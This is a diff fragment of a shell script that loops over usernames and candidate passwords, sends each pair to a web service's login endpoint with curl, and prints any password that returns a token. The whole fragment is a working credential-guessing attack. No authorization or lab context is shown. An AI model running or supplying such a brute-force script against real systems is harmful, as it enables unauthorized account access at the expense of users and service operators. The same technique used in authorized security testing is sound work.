@@ -10,4 +10,14 @@ for u in $USERS; do
     code=$(curl -s -m 30 -o /tmp/li.json -w "%{http_code}" -X POST "$BASE/api/v1/auth/login" \
       -H "Content-Type: application/json" \
       -d "{\"username\":\"$u\",\"password\":\"$p\"}")
-    if [ "$code" = "200" ] && grep -q '"token"' /tmp
+    if [ "$code" = "200" ] && grep -q '"token"' /tmp/li.json 2>/dev/null; then
+      hit="$p"
+      break
+    fi
+  done
+  if [ -n "$hit" ]; then
+    printf "✅ %-20s password=%s\n" "$u" "$hit"
+  else
+    printf "❌ %-20s no match\n" "$u"
+  fi
+done
